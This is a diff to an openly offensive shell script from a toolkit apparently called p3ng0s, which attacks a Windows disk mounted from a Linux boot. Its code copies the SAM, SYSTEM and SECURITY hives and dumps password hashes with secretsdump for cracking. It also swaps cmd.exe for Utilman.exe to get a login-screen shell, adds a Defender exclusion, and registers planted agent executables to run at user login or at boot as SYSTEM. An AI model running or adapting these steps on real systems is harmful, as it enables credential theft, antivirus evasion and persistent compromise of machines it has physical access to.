@@ -87,19 +87,22 @@ function linux_exp() {
 function windows_hashcat_exp() {
     systemctl stop p3ng0s-cracker-watcher.path
     [ ! -d $LOOT_FOLDER/hashcat ] && mkdir -p $LOOT_FOLDER/hashcat
-    /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | grep -E '^[^:]+:[^:]+:[^:]+:([a-fA-F0-9]{32}):{3}$' | cut -d: -f4 > $LOOT_FOLDER/hashcat/hash.1000
+    cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM
+    cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM
+    cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY
+    /opt/pentest/impacket/bin/secretsdump.py -sam $LOOT_FOLDER/SAM -system $LOOT_FOLDER/SYSTEM -security $LOOT_FOLDER/SECURITY LOCAL | grep -E '^[^:]+:[^:]+:[^:]+:([a-fA-F0-9]{32}):{3}$' | cut -d: -f4 > $LOOT_FOLDER/hashcat/hash.1000
 }
 
 function windows_exclusion_path_exp() {
     mkdir -p /mnt/Windows/Tasks/p3ng0s/
-    hivexregedit --merge "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/defender_exclude_persistence.reg
+    hivexregedit --merge "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/reg/defender_exclude_persistence.reg
 }
 
 function windows_user_login_exp() {
     if [ -f $LOOT_FOLDER/agent.exe ]; then
         [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
         cp $LOOT_FOLDER/agent.exe /mnt/Windows/Tasks/p3ng0s/agent.exe
-        hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SOFTWARE' "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/exe_on_user_login.reg
+        hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SOFTWARE' "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/reg/exe_on_user_login.reg
     fi
 }
 
@@ -107,7 +110,7 @@ function windows_boot_service_exp() {
     if [ -f $LOOT_FOLDER/agent.svc.exe ]; then
         [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
         cp $LOOT_FOLDER/agent.svc.exe /mnt/Windows/Tasks/p3ng0s/agent.svc.exe
-        hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SYSTEM' "/mnt/Windows/System32/config/SYSTEM" /etc/p3ng0s/os_killer/service_start_on_boot.reg
+        hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SYSTEM' "/mnt/Windows/System32/config/SYSTEM" /etc/p3ng0s/os_killer/reg/service_start_on_boot.reg
     fi
 }
 
@@ -116,9 +119,9 @@ function windows_exp() {
         SEL=$(dialog --title "What are you looking for?" \
             --menu "...." 20 70 15 \
             1 "r: Dump SAM/SYSTEM/SECURITY/SOFTWARE ^^" \
-            2 "w: Swap cmd.exe and utilman.exe" \
-            3 "r: Secrets dump me baby right now" \
-            4 "r: Dump the hashes to then hashcat them ^^" \
+            2 "r: Dump the hashes to then hashcat them ^^" \
+            3 "w: Swap cmd.exe and utilman.exe" \
+            4 "rw: Secrets dump me baby right now" \
             5 "rw: Create defender exclusion path in C:\\Windows\\Tasks\\p3ng0s\\" \
             6 "rw: Infect on user login (requires: loot/agent.exe)" \
             7 "rw: Infect on boot as NT Authority/System (requires: loot/agent.svc.exe)" \
@@ -131,9 +134,9 @@ function windows_exp() {
         fi
 
         [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY; cp -r /mnt/Windows/System32/config/SOFTWARE $LOOT_FOLDER/SOFTWARE)
-        [ $SEL = 2 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
-        [ $SEL = 3 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
-        [ $SEL = 4 ] && windows_hashcat_exp
+        [ $SEL = 2 ] && windows_hashcat_exp
+        [ $SEL = 3 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
+        [ $SEL = 4 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
         [ $SEL = 5 ] && windows_exclusion_path_exp
         [ $SEL = 6 ] && windows_user_login_exp
         [ $SEL = 7 ] && windows_boot_service_exp
@@ -175,7 +178,7 @@ function hybernation_check() {
             2>&1 >/dev/tty)
 
         [ $SEL = 1 ] && mount -t ntfs-3g -o ro "$PART" /mnt
-        [ $SEL = 2 ] && $(ntfsfix -d "$PART" && mount -o remove_hiberfile "$PART" /mnt)
+        [ $SEL = 2 ] && $(ntfsfix -d "$PART" ; mount -o remove_hiberfile "$PART" /mnt)
         [ $SEL = 3 ] && mount -t ntfs-3g -o remove_hiberfile=no "$PART" /mnt
     else
         mount $PART /mnt
